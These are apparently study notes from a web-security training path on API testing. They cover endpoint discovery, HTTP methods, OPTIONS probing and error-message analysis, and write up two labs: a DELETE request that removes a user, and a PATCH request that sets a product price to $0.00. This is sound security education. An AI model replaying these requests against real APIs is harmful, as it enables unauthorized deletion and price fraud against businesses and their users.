# Identifying and Interacting with API Endpoints

## Overview

The first part of the API Testing learning path focused on identifying API endpoints and understanding how to interact with them.

The main goal was to discover API functionality that may not be directly exposed through the website's front-end.

Topics covered:

- API documentation
- API endpoint discovery
- HTTP methods
- The `OPTIONS` method
- Finding unused API endpoints
- Testing discovered functionality
- Using error messages to understand expected parameters

---

## 1. API Documentation

API documentation can reveal API endpoints, supported functionality, HTTP methods, parameters, and expected request formats.

During the lab, an API documentation page was available at:

    /api/

The documentation revealed endpoints including:

    GET /user/[username]
    DELETE /user/[username]

This provided additional attack surface that was not necessarily exposed through the normal website interface.

### Pentester Mindset

When testing an application, API documentation should be one of the first things to investigate.

Documentation can reveal functionality that the front-end does not expose.

---

## 2. HTTP Methods

An API endpoint can support different HTTP methods, and different methods may expose different functionality.

Common HTTP methods:

    GET      → retrieve data
    POST     → submit or create data
    PUT      → update or replace data
    PATCH    → partially update data
    DELETE   → delete data
    OPTIONS  → identify supported methods

The important point from a testing perspective is:

> Do not assume that the HTTP method used by the front-end is the only method supported by the endpoint.

---

## 3. OPTIONS Method

The `OPTIONS` method can be used to determine which HTTP methods an endpoint supports.

For example:

    OPTIONS /api/products/1/price

The endpoint indicated that it supported:

    GET, PATCH

This was important because the normal endpoint functionality used `GET`, while `PATCH` exposed additional functionality.

### Testing Method

The testing process was:

    Identify endpoint
          ↓
    Send OPTIONS request
          ↓
    Identify supported methods
          ↓
    Test interesting methods

---

## 4. Finding Unused API Endpoints

An API may contain endpoints that are not used by the website's front-end.

These endpoints can still be directly accessible and therefore represent additional attack surface.

During the lab, we discovered:

    GET /api/products/1/price

This endpoint was not part of the normal functionality we were using through the front-end.

We then investigated it using:

    OPTIONS /api/products/1/price

The response indicated that `PATCH` was supported.

---

## 5. Exploiting an Unused API Endpoint

After discovering that `PATCH` was supported, we changed the request to:

    PATCH /api/products/1/price

Initially, the server returned an error because the expected request body was missing.

We added:

    Content-Type: application/json

and sent:

    {}

The server responded:

    'price' parameter missing in body

This error revealed that the API expected a `price` parameter.

We then tested:

    {
      "price": 0
    }

The server returned:

    {
      "price": "$0.00"
    }

The price was successfully changed to `$0.00`.

We were then able to purchase the product and complete the lab.

### Attack Flow

    Find unused endpoint
            ↓
    OPTIONS request
            ↓
    Discover PATCH
            ↓
    PATCH request
            ↓
    Analyze error
            ↓
    Discover required parameter
            ↓
    Set price to 0
            ↓
    Purchase product
            ↓
    Lab solved

---

## 6. API Endpoint Testing Methodology

The main methodology learned from this section was:

    1. Discover API documentation
            ↓
    2. Identify API endpoints
            ↓
    3. Understand the endpoint functionality
            ↓
    4. Identify supported HTTP methods
            ↓
    5. Look for unused or undocumented endpoints
            ↓
    6. Test interesting methods
            ↓
    7. Analyze server responses and errors
            ↓
    8. Identify accepted parameters
            ↓
    9. Test the discovered functionality

---

## 7. Key Takeaways

- API documentation can reveal additional attack surface.
- The front-end does not necessarily expose all API functionality.
- An endpoint may support multiple HTTP methods.
- `OPTIONS` can reveal supported HTTP methods.
- Unused API endpoints should be investigated.
- Error messages can reveal expected parameters and request formats.
- A discovered endpoint should be tested based on how the server actually responds.

---

## 8. Labs Completed

### Exploiting an API Endpoint Using Documentation

Objective:

    Delete the user "carlos"

Discovered endpoint:

    DELETE /user/carlos

Result:

    User deleted successfully.

Status:

    SOLVED

---

### Finding and Exploiting an Unused API Endpoint

Objective:

    Purchase the product at a modified price.

Discovered endpoint:

    GET /api/products/1/price

Supported method discovered with `OPTIONS`:

    PATCH

Final request:

    PATCH /api/products/1/price
    Content-Type: application/json

Body:

    {
      "price": 0
    }

Response:

    {
      "price": "$0.00"
    }

Result:

    Product price successfully changed to $0.00.

Status:

    SOLVED